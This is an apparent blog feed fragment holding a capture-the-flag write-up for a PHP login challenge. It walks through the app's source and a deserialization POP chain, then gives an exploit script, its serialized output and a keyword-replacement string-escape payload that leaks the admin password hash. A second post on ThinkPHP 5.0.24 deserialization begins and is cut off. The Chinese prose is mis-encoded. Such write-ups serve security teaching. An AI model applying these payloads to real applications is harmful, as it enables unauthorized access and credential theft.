class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">   &lt;form action=<span class="string">&quot;login.php&quot;</span> method=<span class="string">&quot;post&quot;</span> style=<span class="string">&quot;margin-top: 300&quot;</span>&gt;</span><br><span class="line">      &lt;h2&gt;ç™¾ä¸‡å‰ç«¯çš„ç”¨æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ&lt;/h2&gt;</span><br><span class="line">      &lt;h3&gt;åŠæˆå“ç³»ç»Ÿ ç•™åé—¨çš„ç¨‹åºå‘˜å·²ç»è·‘è·¯&lt;/h3&gt;</span><br><span class="line">              &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;UserName&quot;</span> required&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;password&quot;</span> style=<span class="string">&quot;margin-top: 20&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;button style=<span class="string">&quot;margin-top:20;&quot;</span> type=<span class="string">&quot;submit&quot;</span>&gt;ç™»å½•&lt;/button&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;img src=<span class="string">&#x27;img/1.jpg&#x27;</span>&gt;å¤§å®¶è®°å¾—åšå¥½é˜²æŠ¤&lt;/img&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$user</span>-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€äº›sqlæ³¨å…¥çš„å…³é”®å­—</p><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»º$userså¯¹è±¡ï¼Œæ‰§è¡Œupdate()å‡½æ•°ä¹‹åï¼Œè‹¥session[â€˜loginâ€™]===1å°±æ˜¾ç¤ºflag</p><p><strong>lib.php</strong></p><p>Userç±»çš„__destruct()å‡½æ•°å¤„æœ‰æ³¨é‡Šæé†’<code>å±</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯ååºåˆ—åŒ–ï¼Œæœ¬é¢˜è€ƒç‚¹åº”è¯¥å°±æ˜¯è¿™ä¸ª</p><p>safe()å‡½æ•°ä¼šæ›¿æ¢ä¸€äº›å…³é”®å­—ä¸º<code>hacker</code>ï¼Œè¿™é‡Œåé¢å¯ä»¥ç”¨æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Userç±»ä¸­æœ‰update()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Info</span>=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span>=<span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å‡½æ•°ï¼Œè·Ÿè¿›å…¶ä¸­çš„getNewinfo()ï¼Œè¯¥å‡½æ•°ä¼šnewä¸€ä¸ªInfoç±»å¹¶å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–å’Œsafeæ›¿æ¢ï¼Œä¸”å‚æ•°$ageï¼Œ$nicknameå¯æ§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥Infoç±»ï¼Œæœ‰__call()å‡½æ•°å¯ä»¥è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰login()å‡½æ•°çš„å°±æ˜¯Userç±»å’ŒdbCtrlç±»ï¼Œå…¶ä¸­User-&gt;login()ä¹Ÿä¼šè°ƒç”¨dbCtrl-&gt;login()ï¼Œè·Ÿè¿›dbCtrl-&gt;login()ï¼Œä»ä¸­å¯çŸ¥ç”¨æˆ·åä¸º<code>admin</code>ï¼Œè¿˜ä¼šè¿”å›ä¸€ä¸ª<code>$idresult</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">    <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">    <span class="variable">$result</span>-&gt;close();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°Infoç±»ï¼Œæƒ³è¦è°ƒç”¨__call()ï¼Œé¦–å…ˆè¦è°ƒç”¨ä¸€ä¸ªInfoç±»ä¸­ä¸å¯è®¿é—®çš„å‡½æ•°</p><p>å†å›åˆ°Userç±»ï¼Œè¿™é‡Œé¢æœ‰ä¸€ä¸ª__string()å‡½æ•°ï¼Œè¯¥å‡½æ•°æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥UpdateHelperç±»ï¼Œå…¶__destruct()æœ‰<code>echo $this-&gt;sql</code>ï¼Œè‹¥ä»¤<code>$sql = new User()</code>ï¼Œå°±ç›¸å½“äºæ˜¯åœ¨æŠŠUserç±»å½“ä½œå­—ç¬¦ä¸²å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Špopé“¾ä¸ºï¼š</p><p><code>UpdateHelper-&gt;__destruct() =&gt; User-&gt;__tostring() =&gt; Info-&gt;__call() =&gt; dbCtrl-&gt;login()</code> </p><p>ä¸‹é¢æ˜¯expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$update</span> = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$update</span>-&gt;sql = <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;nickname = <span class="variable">$info</span>;</span><br><span class="line"><span class="variable">$info</span>-&gt;CtrlCase = <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$ans</span> = serialize(<span class="variable">$update</span>);</span><br><span class="line"><span class="variable">$ans</span> = <span class="string">&#x27;&quot;;s:8:CtrlCase;&#x27;</span>.<span class="variable">$ans</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ans</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="variable">$ans</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœä¸º</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:<span class="number">8</span>:CtrlCase;O:<span class="number">12</span>:<span class="string">&quot;UpdateHelper&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;newinfo&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sql&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">45</span>:<span class="string">&quot;select password,id from user where username=?&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;CtrlCase&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;dbCtrl&quot;</span>:<span class="number">8</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;hostname&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;127.0.0.1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbuser&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;dbpass&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;database&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;mysqli&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"><span class="number">431</span></span><br></pre></td></tr></table></figure><p>å…±éœ€è¦é€ƒé€¸431ä¸ªå­—ç¬¦ï¼Œæ•…åœ¨$anså‰é¢æ·»åŠ 88ä¸ªâ€™ä¸3ä¸ªunionï¼Œæœ€ç»ˆpayloadä¸ºï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">age</span>=<span class="number">1</span>&amp;nickname=<span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="string">&#x27;&#x27;&#x27;&#x27;unionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°md5åŠ å¯†è¿‡çš„å¯†ç ï¼Œè§£å¯†ï¼Œå†ç™»å½•å³å¯å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Zer0pts2020-canyouguessit&quot;&gt;&lt;a href=&quot;#Zer0pts2020-canyouguessit&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]canyouguessit&quot;&gt;&lt;/a&gt;[Zer0pts20</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æåŠå¤ç°</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-01-16T03:40:05.000Z</published>
    <updated>2022-01-17T08:10:31.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¯”èµ›é‡åˆ°çš„ä¸€ä¸ªthinkphpæ¡†æ¶çš„è€ƒç‚¹ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€äº›å¤§ä½¬çš„æ–‡ç« ï¼ŒæŠŠæ¼æ´å¤ç°ä¸€ä¸‹ï¼Œæ•´ä¸ªæ¼æ´åˆ©ç”¨çš„æµç¨‹èµ°ä¸€é</p><h1 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h1><p>phpstudy8.1(wamp)</p><p>thinkphp5.0.24</p><p>php7.3.4</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>åœ¨<code>/application/index/controller/index.php</code>ä¸­æ·»åŠ ååºåˆ—åŒ–åˆ©ç”¨ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 